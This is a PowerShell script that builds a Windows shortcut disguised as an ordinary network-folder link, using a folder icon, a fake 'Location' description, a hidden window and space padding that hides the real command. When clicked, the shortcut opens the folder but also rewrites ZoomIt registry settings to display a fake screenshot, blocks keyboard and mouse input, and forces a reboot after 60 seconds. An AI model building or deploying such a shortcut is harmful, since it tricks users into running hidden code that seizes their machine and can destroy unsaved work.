



$lnktarget = '\\domain\files\folder'
$lnklocation = '\\domain\files\folder'
$descname = 'DESCRIPTION'
$lnkpath = 'C:\temp\n\lnkname.lnk'
$icon = 'C:\windows\system32\shell32.dll,220' 
rm $lnkpath

#to avoid having to repeat the same string, we only have 1024bytes of data allowed in the link target field.
$vars = @(
"`$q='HKCU:\software\Sysinternals\ZoomIt\'";
"`$v=@{'BreakBackgroundFile'='C:\temp\n\Capture.png';'OptionsShown'=1;'BreakTimeout'=1;'ShowTrayIcon'=0;'ShowExpiredTime'=0;'EulaAccepted'=1;'BreakShowBackgroundFile'=1;'BreakBackgroundStretch'=1;'BreakShowDesktop'=0};";
""
) -join ';'

#script to run when link is clicked
$script = @(
"`$c = '[DllImport(\`"user32.dll\`")]public static extern bool BlockInput(bool fBlockIt);'";
"`$x = add-type  -m `$c -name BS -namesp BS -pas";
"ni `$q.substring(0,28) -ea si";
"ni `$q -ea si";
"`$v.keys|%{sp `$q `$_ `$v[`$_]}";
"taskkill /f /im zoomit.exe";
"shutdown -f -r -t 60 -c bye";
"sleep 1";
".\zoomit";
"[reflection.assembly]::loadwithpartialname('system.windows.forms')";
"[windows.forms.sendkeys]::SendWait('^3')";
"`$x::BlockInput(1)";#only works when running as admin.
"`$error>C:\temp\n\log") -join ';'



$wsh = New-Object -ComObject wscript.shell
$lnk = $wsh.CreateShortcut($lnkpath)
$lnk.TargetPath = 'C:\windows\system32\windowspowershell\v1.0\powershell.exe'
$lnk.IconLocation = $icon
$command = 'ii '+"'$lnktarget';"+$vars+$script
$pre = "'"+' '*141+$lnktarget+' '*20+"';"
$lnk.Arguments = '-wi hi -c "' +$pre+$command+'"'
$lnk.WindowStyle = 7
$lnk.Description = "Location: $descname ($lnklocation)"
$lnk.save()



